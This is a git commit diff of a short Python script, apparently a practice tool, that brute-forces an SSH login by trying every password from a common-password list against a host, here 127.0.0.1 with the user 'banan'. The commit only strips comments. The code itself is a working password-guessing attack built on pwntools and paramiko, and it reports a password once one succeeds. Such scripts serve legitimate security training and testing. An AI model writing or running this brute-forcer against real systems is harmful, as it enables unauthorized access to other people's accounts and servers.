ab4317ba1d401b8e50e050750856928b89183cb0
banan <87866914+banankhanfar@users.noreply.github.com>
2024-01-31 11:19:40 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,17 +1,17 @@
 from pwn import *
-import paramiko#error handling
+import paramiko
 
-host="127.0.0.1" #brute force for this host
+host="127.0.0.1" 
 username="banan"
-attempts=0 #keep log of number of hosts attemps here we will know how many requests it's taken for us to be able to authentic.
+attempts=0 
 
 
-with open("ssh-common-password.txt","r") as password_list:#read 
+with open("ssh-common-password.txt","r") as password_list:
 	for password in password_list:
 		password=password.strip("\n")
 		try:#we use it for handling error authentication error.
 			print("[{}] Attempting password: '{}'!".format(attempts,password))
-			response=ssh(host=host,user=username,password=password,timeout=1)#making ssh connection
+			response=ssh(host=host,user=username,password=password,timeout=1)
 			if response.connected():#if authenticated connect done
 				print("[>] valid password found: '{}'!".format(password))
 				response.close()
